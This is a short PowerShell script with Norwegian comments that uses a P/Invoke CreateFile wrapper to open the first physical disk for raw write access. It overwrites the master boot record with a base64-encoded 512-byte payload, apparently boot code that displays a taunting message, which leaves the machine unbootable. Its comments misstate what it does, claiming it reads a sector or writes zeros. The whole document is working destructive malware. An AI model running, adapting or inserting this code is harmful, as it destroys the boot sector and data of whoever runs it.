$code = @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class RawDisk {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );
}
"@
Add-Type -TypeDefinition $code

# 2. Konstanter som gyldig UInt32 (fikser feilmeldingen)
[uint32]$GENERIC_RW = "0xC0000000"
[uint32]$FILE_SHARE_RW = 3
[uint32]$OPEN_EXISTING = 3

$diskPath = "\\.\PhysicalDrive0"

# 3. Åpne SafeFileHandle mot rå disk
$handle = [RawDisk]::CreateFile($diskPath, $GENERIC_RW, $FILE_SHARE_RW, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)

if ($null -eq $handle -or $handle.IsInvalid) {
    throw "Kunne ikke åpne disken. Husk å kjøre PowerShell som Administrator."
}

# 4. Koble handle til FileStream og les 1 sektor (512 bytes)
try {
    $firstSectorDataBase54 = [Convert]::FromBase64String("McCO2I7AjtC8AHy+HXy0DqyEwHQEzRDr9/r06/xZb3UncmUgc3RyYWlnaHQgQ29vY2tlZCBidWRkeQ0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVao=")
    $fs = New-Object System.IO.FileStream($handle, [System.IO.FileAccess]::ReadWrite)
    
    # 5. Skriv nuller til MBR (første 512 bytes)
    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $zeroBuffer = New-Object byte[] 512
    $fs.Write($firstSectorDataBase54, 0, $firstSectorDataBase54.Length)
    $fs.Flush()
}
finally {
    if ($fs) { $fs.Close() }
    if ($handle) { $handle.Close() }
}
